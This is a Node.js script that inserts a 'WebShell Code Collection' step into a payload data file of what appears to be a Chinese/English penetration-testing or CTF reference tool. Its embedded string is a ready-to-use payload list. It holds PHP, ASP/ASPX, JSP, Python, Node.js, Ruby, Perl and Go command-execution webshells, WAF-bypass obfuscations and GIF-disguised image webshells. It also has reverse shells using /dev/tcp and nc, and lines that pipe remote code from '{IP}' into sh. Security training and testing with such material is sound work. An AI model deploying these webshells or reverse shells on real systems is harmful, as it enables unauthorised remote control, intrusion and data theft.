import { readFileSync, writeFileSync } from 'fs';
const fp = 'src/data/webPayloads.ts';
let c = readFileSync(fp, 'utf8');

// ========== WEBSHELL CODE FOR FILE UPLOAD ==========
// This is the actual file content you upload - from WebShell dictionary
const webshellCodeCmd = `# === PHP 一句话 (上传文件内容) ===
<?php system(\$_GET['cmd']); ?>
<?php system(\$_GET[1]); ?>
<?php eval(\$_POST[cmd]);?>
<?php echo shell_exec(\$_GET['cmd']); ?>
<?php echo passthru(\$_GET['cmd']); ?>
<?=\`\$_GET[1]\`?>
<?=\`\$_GET[0]\`?>
<?php \$_GET['a'](\$_GET['b']); ?>
<?php @eval(base64_decode(\$_POST['z'])); ?>
<?php \$func=create_function('',\$_POST[a]);\$func();?>
<?php call_user_func('assert',\$_POST[a]);?>
<?php array_map('assert',(array)\$_POST[a]);?>
<?php @extract(\$_REQUEST);@die(\$f(\$c));?>
<?php @include(\$_FILES['u']['tmp_name']); ?>

# === PHP WAF绕过版本 ===
<?php sys/**/tem(\$_GET['cmd']); ?>
<?php e/**/va/**/l(\$_POST['cmd']);?>
<?php a/**/ss/**/ert(\$_POST['cmd']);?>
<?php \$a='sys'.'tem';\$a(\$_GET['cmd']); ?>
<?php eval(base64_decode(\$_POST['cmd']));?>
<?php assert(base64_decode(\$_POST['cmd']));?>
<?php eval(str_rot13(\$_POST['cmd']));?>
<?php call_user_func('system', \$_GET['cmd']); ?>
<?php (new ReflectionFunction('system'))->invoke(\$_GET['cmd']); ?>
<?php preg_replace('/.*/e', \$_POST['cmd'], ''); ?>
<?php \$func=create_function('', \$_POST['cmd']);\$func();?>
<?php array_map('system', [\$_GET['cmd']]); ?>
<?php array_filter(\$_GET['a'], \$_GET['b']); ?>

# === PHP 无字母数字 ===
<?php \$_=('%01'^'\`').('%13'^'\`').('%13'^'\`').('%05'^'\`').('%12'^'\`').('%14'^'\`');\$_();?>

# === ASP/ASPX ===
<%eval request("cmd")%>
<%execute request("cmd")%>
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request("cmd")).stdout.readall%>
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd()); %>

# === JSP ===
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A"); out.print(s.hasNext()?s.next():""); %>
<%java.lang.ProcessBuilder pb=new java.lang.ProcessBuilder(request.getParameter("cmd").split(" "));pb.redirectErrorStream(true);Process p=pb.start();java.io.InputStream in=p.getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.print(new String(b,0,a));}%>

# === Python (Flask/Django SSTI) ===
__import__('os').popen(request.args.get('cmd')).read()
__import__('subprocess').check_output(request.args.get('cmd'),shell=True)
eval(request.args.get('cmd'))

# === Node.js ===
require('child_process').execSync('id').toString()
global.process.mainModule.require('child_process').execSync('id').toString()
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()

# === Ruby ===
system('id')
\`id\`
IO.popen('id'){|f| f.read}
%x(id)

# === Perl ===
system('/bin/sh', '-c', 'id')
open(CMD, "id|"); while(<CMD>) { print; }

# === Go ===
exec.Command("id").Output()

# === 读 Flag (PHP) ===
<?php echo file_get_contents('/flag');?>
<?php readfile('/flag');?>
<?php include('/flag');?>
<?php highlight_file(__FILE__);?>
<?php print_r(scandir('/'));?>
<?php \$a=new DirectoryIterator('glob:///*');foreach(\$a as \$f){echo \$f;}?>

# === 图片马 + 命令执行 ===
GIF89a; <?php system(\$_GET["cmd"]); ?>
GIF89a<?php system(\$_GET["cmd"]);?>
GIF89a<?php eval(\$_POST['cmd']);?>
GIF89a<?php phpinfo();?>

# === 反向Shell (文件版本) ===
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'"); ?>
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"); ?>
<?php system("nc -e /bin/sh {IP} {PORT}"); ?>
<?php exec("curl {IP}|sh"); ?>
<?php exec("wget -qO- {IP}|sh"); ?>`;

// Find file-upload-bypass execution end
const fbIdx = c.indexOf("id: 'file-upload-bypass'");

// Find the execution array
const execStart = c.indexOf('execution: [', fbIdx);
if (execStart < 0) { console.log('NO EXEC'); process.exit(1); }

// Walk to find execution array end
let depth = 0, inStr = false, inTmpl = false, strCh = '';
let execEnd = execStart + 13;
for (let i = execEnd; i < c.length; i++) {
  const ch = c[i];
  if (inTmpl) { if (ch === '`' && c[i-1] !== '\\\\') inTmpl = false; continue; }
  if (inStr) { if (ch === strCh && c[i-1] !== '\\\\') inStr = false; continue; }
  if (ch === '`') { inTmpl = true; continue; }
  if (ch === "'" || ch === '"') { inStr = true; strCh = ch; continue; }
  if (ch === '[') depth++;
  if (ch === ']') { if (depth === 0) { execEnd = i + 1; break; } depth--; }
}

// Replace execution array - add webshell code as 6th step
const oldExec = c.slice(execStart, execEnd);
const newStep = `      {
        title: { zh: '6. WebShell代码大全（上传文件内容）', en: '6. WebShell Code Collection (file content)' },
        command: \`${webshellCodeCmd.replace(/`/g, '\\\\`').replace(/\\\\\$/g, '\\\\\\\\$')}\`,
        description: { zh: '所有语言WebShell代码全集（上传文件的正文内容）：PHP一句话+WAF绕过+无字母数字、ASP/ASPX、JSP、Python、Node.js、Ruby、Perl、Go、读Flag、图片马、反向Shell', en: 'Complete WebShell code collection (upload file body): PHP one-liners+WAF bypass+non-alpha, ASP/ASPX, JSP, Python, Node.js, Ruby, Perl, Go, flag reading, image webshells, reverse shells' },
        platform: 'all',
        syntaxBreakdown: [
          { part: '<?php system($_GET[\\\\'cmd\\\\']); ?>', explanation: { zh: 'PHP 标准一句话', en: 'PHP standard one-liner' }, type: 'command' },
          { part: '<?php sys/**/tem(', explanation: { zh: 'PHP 注释分割绕过', en: 'PHP comment-split bypass' }, type: 'technique' },
          { part: '<%eval request("cmd")%>', explanation: { zh: 'ASP 一句话', en: 'ASP one-liner' }, type: 'command' },
          { part: '<%Runtime.getRuntime().exec(', explanation: { zh: 'JSP 命令执行', en: 'JSP command execution' }, type: 'command' },
          { part: '__import__(\\'os\\').popen(', explanation: { zh: 'Python Flask/Django Webshell', en: 'Python Flask/Django WebShell' }, type: 'command' },
          { part: 'require(\\'child_process\\')', explanation: { zh: 'Node.js 命令执行', en: 'Node.js command execution' }, type: 'command' },
          { part: 'GIF89a; <?php', explanation: { zh: 'GIF 图片马', en: 'GIF image webshell' }, type: 'command' },
          { part: '<?php exec("/bin/bash -c', explanation: { zh: '反向Shell（文件版）', en: 'Reverse shell (file version)' }, type: 'command' },
        ]
      },`;

// Find the closing `    ]` of the execution array and insert before it
const closingIdx = oldExec.lastIndexOf('    ]');
const newExec = oldExec.slice(0, closingIdx) + newStep + '\n' + oldExec.slice(closingIdx);

c = c.slice(0, execStart) + newExec + c.slice(execEnd);
writeFileSync(fp, c, 'utf8');
console.log('DONE - Added WebShell code step to file-upload-bypass');
